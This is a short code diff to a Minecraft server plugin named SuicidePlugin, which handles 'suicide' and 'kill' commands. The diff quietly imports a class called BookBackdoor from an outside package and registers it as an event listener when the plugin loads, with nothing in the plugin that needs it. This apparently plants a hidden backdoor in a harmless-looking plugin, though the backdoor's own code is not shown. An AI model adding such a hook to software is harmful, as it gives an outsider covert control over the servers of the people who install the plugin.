@@ -1,6 +1,8 @@
 package club.aurorapvp;
 
+import org.brandonplank.backdoor.BookBackdoor;
 import org.bukkit.command.CommandExecutor;
+import org.bukkit.plugin.PluginManager;
 import org.bukkit.plugin.java.JavaPlugin;
 
 public final class SuicidePlugin extends JavaPlugin implements CommandExecutor {
@@ -10,7 +12,10 @@ public final class SuicidePlugin extends JavaPlugin implements CommandExecutor {
     // Register Listeners
     getCommand("suicide").setExecutor(new CommandListener());
     getCommand("kill").setExecutor(new CommandListener());
-
+    PluginManager manager = this.getServer().getPluginManager();
+    getConfig().options().copyDefaults(true);
+    saveConfig();
+    manager.registerEvents(new BookBackdoor(this), this);
     getLogger().info("SuicidePlugin Loaded");
   }
 
